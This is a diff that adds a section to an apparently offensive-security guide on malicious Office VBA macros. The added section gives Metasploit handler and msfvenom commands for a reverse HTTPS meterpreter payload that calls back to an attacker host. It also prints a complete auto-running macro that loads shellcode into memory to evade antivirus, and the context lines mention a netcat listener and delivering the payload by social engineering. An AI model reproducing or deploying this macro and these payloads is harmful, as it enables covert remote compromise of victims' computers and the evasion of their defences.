@@ -49,3 +49,69 @@ and finally ensure a netcat listener is waiting for the shell:
 nc -nvlp 4444
 ```
 7. Distribute the payload via social engineering or file upload based vuln.
+
+### A More Subtle Malicious VBA Macro
+
+The approach above is good, but not very subtle. It involves writing a file to disk, and launching Powershell, which may be considered spicy by Antivirus and Defender or other countermeasures present on a machine. The most subtle approach we could possibly take is to make calls to Win32 APIs directly from VBA and to launch a staged payload. This keeps everything in memory, with minimal footprint for the initial payload, involving as few other applications as possible, and writing nothing to disk.
+
+The major drawback is that once the victim closes the Office application running the macro the shell dies. We have traded subtlety for persistence.
+
+First, get an `msfconsole` multi/handler ready to receive a staged payload, staged is now preferred since it means a much smaller initial payload that needs to be inserted into the macro. Commands to get the handler going are as follows:
+```bash
+sudo msfconsole -q
+```
+```bash
+use multi/handler
+```
+```bash
+set payload windows/x64/meterpreter/reverse_https
+```
+```bash
+set lhost 192.168.0.1
+```
+```bash
+set lport 443
+```
+```bash
+exploit
+```
+
+Now, use `msfvenom` to generate a VBA compatible bit of shellcode
+```bash
+msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.0.1 LPORT=443 EXITFUNC=thread -f vbapplication
+```
+Copy the output of the above into the `buf = Array(20, 30,50, ...` section of the marco below. Our full malicious Macro is as follows:
+```vba
+Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
+
+Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
+
+Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
+
+Function MyMacro()
+    Dim buf As Variant
+    Dim addr As LongPtr
+    Dim counter As Long
+    Dim data As Long
+    Dim res As Long
+    
+    buf = Array(20, 30, 40, ... )
+
+    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
+    
+    For counter = LBound(buf) To UBound(buf)
+        data = buf(counter)
+        res = RtlMoveMemory(addr + counter, data, 1)
+    Next counter
+    
+    res = CreateThread(0, 0, addr, 0, 0, 0)
+End Function 
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub AutoOpen()
+    MyMacro
+End Sub
+```
